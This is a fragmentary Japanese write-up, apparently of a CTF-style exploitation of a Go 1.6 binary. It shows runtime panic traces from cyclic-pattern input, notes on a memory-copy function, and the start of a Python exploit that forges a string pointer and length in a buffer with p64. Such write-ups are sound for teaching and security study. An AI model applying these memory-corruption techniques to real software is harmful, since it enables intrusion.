...
main.main()
   ...
   また、ここでエラーコードから、問題のプログラムはGo言語で書かれていたこともわかる。
...
...
 #+end_example
    いかにもメモリコピーを担当していそうな関数名であるため、この関数について調べてみる。
...
runtime stack:
runtime.throw(0x50c400, 0xd)
        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90
runtime.largeAlloc(0x6161616161616161, 0x3, 0x0)
        /usr/lib/go-1.6/src/runtime/malloc.go:768 +0xdd
runtime.mallocgc.func3()
        /usr/lib/go-1.6/src/runtime/malloc.go:664 +0x33
runtime.systemstack(0x5a0300)
...
runtime.throw(0x50c400, 0xd)
        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90
runtime.largeAlloc(0x6261616161616162, 0x3, 0x0)
        /usr/lib/go-1.6/src/runtime/malloc.go:768 +0xdd
runtime.mallocgc.func3()
        /usr/lib/go-1.6/src/runtime/malloc.go:664 +0x33
runtime.systemstack(0x5a0300)
...
[Inferior 1 (process 38636) exited with code 02]
     ...
     上記のエラーを見てみると、 ~0x6261616161616162~、~0x6261616161616163~ 、 および ~0x626161616161617a~ のパターンの箇所が原因でエラーが発生していると考えられる。
...
...
     ...
     #+begin_src python
       ...
       # name
       buf2[0x68:0x70] = p64(please_ptr) # string ptr
       buf2[0x70:0x78] = p64(0x6)        # string size
